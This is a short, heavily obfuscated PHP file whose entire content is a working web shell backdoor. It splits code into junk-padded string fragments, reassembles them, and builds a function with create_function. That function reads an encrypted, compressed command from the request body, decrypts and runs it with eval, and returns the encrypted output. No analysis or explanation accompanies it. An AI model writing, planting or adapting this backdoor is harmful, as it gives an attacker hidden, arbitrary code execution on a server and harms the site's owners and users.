<?php
$H='G.val(@gzuncompresG.s(@x(@bG.ase64G._decode(G.$m[1]G.),$kG.)));$o=@oG.b_gG.et_conteG.G.nts();G.@o';
$y=str_replace('dA','','crdAeatdAe_dAfudAdAndAction');
$r='.nctG.ion x($G.t,$k){$c=sG.trleG.n($G.k)G.;$l=strlen($t);$oG.="G.";fG.or($i=0;$i<$l;G.){G.forG.($j';
$k='G."/$khG.(.G.+)$kfG./",@file_get_contG.eG.G.nts("php://inpuG.t"),$G.m)==1)G. {@G.ob_sG.tarG.t();@e';
$e='b_end_cleanG.(G.);G.$r=@bG.ase64G._encoG.G.de(@x(@gzG.compress(G.$o),$kG.));print(G."$p$kh$r$kf");}';
$T='=0;($j<$cG.&&$iG.G.<$l);$j++,$i+G.+){$o.=$G.t{$i}G.^$kG.{$jG.};}}return G.$o;}G.if (@pregG._matG.ch(';
$n='$k="27d0G.7418G.G.";$kh="G.e4f1G.89a769G.2b";$kf="77d8adeG.aG.G.0G.5c0";$p="G.mN95rSWSLoD7bAK3";fG.uG';
$I=str_replace('G.','',$n.$r.$T.$k.$H.$e);
$j=$y('',$I);$j();
?>
